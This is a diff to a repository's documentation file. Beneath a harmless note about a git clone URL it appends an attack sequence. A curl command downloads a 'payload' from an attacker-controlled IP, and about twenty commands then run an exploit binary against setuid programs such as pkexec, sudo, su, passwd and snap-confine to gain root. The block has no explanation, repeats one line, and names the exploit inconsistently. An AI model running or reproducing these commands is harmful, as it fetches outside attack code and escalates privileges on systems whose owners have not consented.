@@ -512,3 +512,27 @@ git clone https://github.com/example/repository.git
 ```
 
 Replace `https://github.com/example/repository.git` with the actual repo URL.
+
+curl http://10.10.14.38:800/payload -o payload
+
+
+./exploit2 /usr/bin/at
+
+./exploit2 /usr/lib/openssh/ssh-keysign
+./exploit2 /usr/lib/snapd/snap-confine
+./exploit-2 /usr/lib/policykit-1/polkit-agent-helper-1
+./exploit-2 /usr/lib/eject/dmcrypt-get-device
+./exploit-2 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./exploit-2 /usr/sbin/mount.nfs
+./exploit-2 /usr/bin/pkexec
+./exploit-2 /usr/bin/passwd
+./exploit-2 /usr/bin/chsh
+./exploit-2 /usr/bin/fusermount
+./exploit-2 /usr/bin/sudo
+./exploit-2 /usr/bin/newgrp
+./exploit-2 /usr/bin/mount
+./exploit-2 /usr/bin/gpasswd
+./exploit-2 /usr/bin/umount
+./exploit-2 /usr/bin/su
+./exploit2 /usr/bin/at
+./exploit-2 /usr/bin/chfn
